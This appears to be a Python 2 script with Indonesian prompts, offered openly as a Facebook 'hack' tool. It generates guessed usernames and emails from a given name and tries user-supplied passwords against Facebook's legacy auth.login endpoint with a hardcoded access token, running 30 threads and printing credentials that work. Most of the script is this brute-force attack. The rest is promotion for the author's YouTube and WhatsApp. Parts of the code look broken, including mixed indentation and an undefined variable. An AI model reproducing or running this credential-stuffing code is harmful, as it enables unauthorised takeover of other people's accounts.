# -*- coding UTF-8 -*-
#  Author : MR.404
#  Tools : Geli2 Efbeh
#  Versi : 0.5

versi = "0.5"
import os
try:
	import requests
except ImportError:
	print " \033[93;1m\n     Kamu belum Install modul Requests,\n   Tekan Enter Untuk Install Requests... "
	raw_input(" ====>")
	os.system("pip install requests" if os.name == 'nt' else 'pip2 install requests')
	
try:
	from prettytable import PrettyTable
except ImportError:
	print " \033[93;1m\n     Kamu belum Install modul PTable,\n   Tekan Enter Untuk Install PTable... "
	raw_input(" ====>")
	os.system("pip install PTable" if os.name == 'nt' else 'pip2 install PTable')
	
import requests, json
from brute import brute
from multiprocessing import Process
from multiprocessing.pool import Process, ThreadPool
from useragents import multi_ban, deviv, divev 
import subprocess, sys
	
os.system('' if os.name == 'nt' else 'chmod +x *')
users1 = []

users2 = []
users3 = []
users4 = []
users5 = []
users6 = []

def user_dev():
  try:
  	print multi_ban
  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=5000):\n\033[93;1m  ==> ")
  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
  	# set password
  	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
  		exit('\n \033[91;1m Jangan Kosong Lah Kamprett.. \n')
  	print '\n\033[95;1m<<\033[96;1m Proses Cracking Sedang Berjalan,Tunggu Ajh!\033[95;1m >> \n'
  	sandi1 = san_dev.replace(' ', '\n').replace(',', '\n').replace('/', '\n')
  	sandi = sandi1.replace('\n\n', '\n')
  	# set usernmae
  	userz = us.replace(' ', '')
  	p = open("pass.txt", "w")
  	p.write(sandi)
  	p.close()
	bag = jumlah / 6 + 1
	bag1 = jumlah / 3 + 1
	bag2 = jumlah / 2 + 1
	bag3 = jumlah / 2 + bag
	bag4 = jumlah / 2 + bag1
	

	for dev in range(1, jumlah+1):
		users1.append(userz+str(dev)+'@gmail.com')
	for dev in range(1, jumlah+1):
		users1.append(userz+str(dev)+'@yahoo.com')
	# for dev in range(1, bag):
	# 	users1.append(userz+'.'+str(dev))

	for dev in range(bag, bag1):
		users2.append(userz+'.'+str(dev))
	
	for dev in range(bag1, bag2):
		users3.append(userz+'.'+str(dev))
	
	for dev in range(bag2, bag3):
		users4.append(userz+'.'+str(dev))
	
	for dev in range(bag3, bag4):
		users5.append(userz+'.'+str(dev))
	
	for dev in range(bag4, jumlah+1):
		users6.append(userz+'.'+str(dev))
		
  except KeyboardInterrupt: 
  	exit("\033[91;1m \n Keluar... \n")
  except NameError:
  	exit('\n\033[91;1m Masukkan Angka Dodoll..\n')
  except SyntaxError:
	exit('\n\033[91;1m Masukkan Angka Dodoll..\n ')

def pro_dev(ival):
	pas = open("pass.txt", "r").readlines()
	iqbal = ival.replace('\n', '')
	for iq in pas:
	  try:
	  	iqu = iq.replace('\n', '').replace('\n\n', '') 
	  	dev = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+ival+"&locale=en_US&password="+iqu+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
	  	dev_iv = dev.content
	  	jsl = json.loads(dev_iv)
	  	if "session_key" in dev_iv:
	  		print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ MR404 + '\033[96;1m |\033[97;1m '+ iqu
  	  	elif "www.facebook.com" in jsl["error_msg"]:
 			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ MR404 + '\033[96;1m |\033[92;1m '+ iqu

	  	else:
	  		pass

	  except:
	  	pass

# def dev_id():
# 	for dev in users:
# 		pro = Process(target=pro_dev, args=(dev,))
# 		multi.append(pro)
# 		pro.start()

# 	for dev in multi:
# 		dev.join()

def run():
	dev = ThreadPool(30)
	dev.map(pro_dev, users1)
	
if __name__ == '__main__':
	
	try:
		os.system('cls' if os.name == 'nt' else 'clear')
		
                print("\033[44;1mHello subscriberku\033[00;1m")
                print("\033[37;1m[\033[32;1mAuthor:RAIHAN \033[37;1m]")
                print("\033[37;1m[\033[32;1mMR.404 Developer\033[37;1m]")
		print("\033[37;1m.....................................................\033[37;1m")
                print("\033[37;1m~~~~~~~~~~~~~~~~~~~~~~~MENU HACK FB~~~~~~~~~~~~~~~~~~~~~~~~\033[37;1m")
                print("\033[44;1m{1} Brute Force Target fb / Tanpa Login\033[00;1m")
                print("\033[44;1m{2} Multi Brute Force / Tanpa Login\033[00;1m") 
                print("\033[44;1m{3} Cara Menggunakan /\033[00;1m")
                print("\033[44;1m{4} Subrek my chennel\033[00;1m")
                print("\033[44;1m{5} chat admin[MR.404]\033[00;1m")
                print("\033[37;1m.....................................................\033[37;1m")
                pil = raw_input("\033[96;1m {\033[95;1m?\033[96;1m}\033[92;1m Pilih Opsi\033[93;1m : ")
		if pil == '1':
			brute()
		elif pil == '2':
			user_dev()
			run()

			print "\n\033[97;1m     ==[ \033[96;1m Selesai...... \033[91;1mVersi "+versi+"\033[97;1m  ]== \n"
			divev()
			deviv()

		elif pil== '3':
			try:
				subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
			except KeyboardInterrupt:
				subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
			except WindowsError:
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')

		elif pil == '4':
			try:
				print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi "+versi+" \033[97;1m ]+++" 
				print " \n               \033[93;1m Keunggulan:\n\n   \033[97;1m   Lebih Power Full dibanding yg V.01 \n      bisa mengisi lebih dari 1 password  \n"
				print " \n\033[95;1m   Silahkan subrek channel saya \033[96;1m(MR.404)"
				raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Youtube")
				subprocess.check_output(['am', 'start', 'https://youtube.com/channel/UC0IpDdp5KzL6RfX1RpUxU7Q'])
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
			except KeyboardInterrupt:
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
			except WindowsError:
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
                elif pil == '5':
			try:
				print " \n\n \033[97;1m        +++[ \033[96;1m CHAT MR.404 "+versi+" \033[97;1m ]+++" 
				print " \n               \033[93;1m HACKER\n\n   \033[97;1m   MR.404 \n  YOUR NOOB  \n"
				print " \n\033[95;1m   Silahkan chat \033[96;1m(MR.404)"
                                os.system('termux-open https://api.whatsapp.com/send?phone=6282331072836&text=')
	                except KeyboardInterrupt:
                                os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
                        except WindowsError:
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
            
                else:
			print "\n\033[90;1m Pilih yang Bener lah Kampprett.. "
			divev()
			deviv()
			
	except KeyboardInterrupt:
	        exit("\n\033[90;1m Keluar... ")
